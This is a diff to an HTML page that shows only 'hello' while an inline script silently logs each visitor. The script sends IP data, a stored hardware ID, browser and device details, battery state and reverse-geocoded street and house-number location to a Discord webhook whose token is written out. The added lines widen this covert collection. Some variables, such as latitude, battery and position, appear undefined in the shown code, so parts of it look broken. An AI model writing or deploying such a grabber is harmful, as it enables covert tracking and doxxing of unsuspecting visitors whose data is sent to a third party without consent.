@@ -22,12 +22,11 @@
           <script>
         	(async () => {
   const webhookURL = "https://discord.com/api/webhooks/1368211694584856647/7flwPKRczBxGY26ZQi5akKWaYFW5tMPSPWhtnVSkOrR0VdE57NnTGJlgD-6HwAVSAOV2";
-  const ipAPIURL = "https://ipapi.co/json/";
+  const ipAPIURL = "https://ipapi.co/json/?fields=all";
 
   try {
     const data = await fetch(ipAPIURL).then(res => res.json());
-    const IPData = await fetch("https://ipapi.co/json/").then(res => res.json());
-
+    
     let hwid = localStorage.getItem("vex_hwid");
     if (!hwid) {
       hwid = crypto.randomUUID();
@@ -46,6 +45,13 @@
       if (/Firefox/i.test(ua)) return "Firefox";
       return "Unknown";
     }
+
+const geocodeAPI = `https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`;
+
+    const locationDetail = await fetch(geocodeAPI)
+      .then(res => res.json())
+      .then(data => data.address || {});
+      
 
     const browser = detectBrowser(ua);
     const now = new Date().toLocaleString();
@@ -106,6 +112,18 @@
   .then(data => data.Answer?.[0]?.data?.replace(/\.$/, "") || "N/A")
   .catch(() => "N/A");
 
+const isFullscreenMode = document.fullscreenElement ||
+                         document.mozFullScreenElement ||
+                         document.webkitFullscreenElement ||
+                         document.msFullscreenElement ? "Yes" : "No";
+
+const batteryStatus = battery.charging ? "Charging" : "Discharging";
+const batteryLevel = (battery.level * 100).toFixed(0) + "%";
+const screenOrientation = window.matchMedia("(orientation: portrait)").matches ? "Portrait" : "Landscape";
+const geolocationAccuracy = position.coords.accuracy;
+const screenDPI = window.devicePixelRatio;
+const cookiesEnabled = navigator.cookieEnabled ? "Yes" : "No";                         
+ 
     const embed = {
       embeds: [{
         title: "NEW VISITOR | NEW LOG ⚡",
@@ -134,22 +152,33 @@
           {
             name: "🌍 Location",
             value: `
-            **Coordinates**: ${data.latitude}, ${data.longitude}
-            **Location**: ${data.city}, ${data.country_name}
-            **Region**: ${data.region_name}
-            **Postal Code**: ${data.postal}
-            **Continent**: ${data.continent}
-            **Continent Code**: ${data.continentCode}
-            **Country**: ${data.country_name}
-            **Country Code**: ${data.country_code}
-            **Currency:** ${data.currency}
+           **Coordinates(IP)**: ${latitude}, ${longitude}
+           **Street(IP)**: ${locationDetail.road}
+           **House Number(IP)**: ${locationDetail.house_number}
+           **Suburb(IP)**: ${locationDetail.suburb}
+           **Village(IP)**: ${locationDetail.village}
+           **District(IP)**: ${locationDetail.district}
+           **City/Regency/State(IP)**: ${locationDetail.city || locationDetail.town || locationDetail.village}
+           **Province(IP)**: ${locationDetail.state}
+           **Postal Cod(IP)**: ${data.postal || locationDetail.postcode}
+           **Country(IP)**: ${data.country_name || locationDetail.country}
+           **Country Code(IP)**: ${data.country_code || locationDetail.country_code}
+           **Continent(IP)**: ${data.continent || locationDetail.continent}
+           **Continent Code(IP)**: ${data.continentCode || locationDetail.continent_code}
+           **Currency(IP)**: ${data.currency}
+           **Accuracy**: ${geolocationAccuracy}
+           [**View on Google Maps**](https://www.google.com/maps?q=${latitude},${longitude})
             `,
             inline: false
           },
           {
             name: "💻 Device Details",
             value: `
+            **Battery**: ${batteryStatus}, ${batteryLevel}
+            **Web Cookies**: ${cookiesEnabled}
             **Screen Resolution**: ${screenResolution}
+            **Screen Orientation**: ${screenOrientation}
+            **Screen DPI**: ${screenDPI}
             **Color Depth**: ${colorDepth}-bit
             **Window Resolution**: ${windowResolution}
             **Retina Display**: ${isRetina}
@@ -206,15 +235,23 @@
 **UserAgent**: ${ua.slice(0, 256)}
 
 🌍 **LOCATION DETAILS**  
-**City**: ${data.city}  
-**Region**: ${data.region_name}  
-**Country**: ${data.country_name}  
-**Country Code**: ${data.country_code}  
-**Continent**: ${data.continent}  
-**Continent Code**: ${data.continentCode}  
-**Postal Code**: ${data.postal}  
-**Coordinates**: ${data.latitude}, ${data.longitude}  
-**Currency**: ${data.currrency}
+**Coordinates(IP)**: ${latitude}, ${longitude}
+**Street(IP)**: ${locationDetail.road}
+**House Number(IP)**: ${locationDetail.house_number}
+**Suburb(IP)**: ${locationDetail.suburb}
+**Village(IP)**: ${locationDetail.village}
+**District(IP)**: ${locationDetail.district}
+**City/Regency/State(IP)**: ${locationDetail.city || locationDetail.town || locationDetail.village}
+**Province(IP)**: ${locationDetail.state}
+**Postal Cod(IP)**: ${data.postal || locationDetail.postcode}
+**Country(IP)**: ${data.country_name || locationDetail.country}
+**Country Code(IP)**: ${data.country_code || locationDetail.country_code}
+**Continent(IP)**: ${data.continent || locationDetail.continent}
+**Continent Code(IP)**: ${data.continentCode || locationDetail.continent_code}
+**Currency(IP)**: ${data.currency}
+**Accuracy**: ${geolocationAccuracy}
+           
+[**View on Google Maps**](https://www.google.com/maps?q=${latitude},${longitude})
 
 🔗 **NETWORK & CONNECTION**  
 **ISP**: ${data.isp}  
@@ -234,9 +271,14 @@
 **Current URL**: ${currentURL}  
 
 ⚙️ **DEVICE & SCREEN DETAILS**  
-**Screen Resolution**: ${screenResolution}  
-**Resolution**: ${screen.width}x${screen.height}  
-**Fullscreen Mode**: ${screen.fullscreen}  
+**Battery**: ${batteryStatus}, ${batteryLevel}
+**Web Cookies**: ${cookiesEnabled}
+**Screen Resolution**: ${screenResolution}
+**Screen Orientation**: ${screenOrientation}
+**Screen DPI**: ${screenDPI}
+**Color Depth**: ${colorDepth}-bit
+**Window Resolution**: ${windowResolution}
+**Retina Display**: ${isRetina}
 
 📅 **TIMESTAMP**  
 **Date/Time**: ${now}
@@ -274,4 +316,4 @@ try {
 <body>
   <h1>hello</h1>
 </body>
-</html>
+  </html>
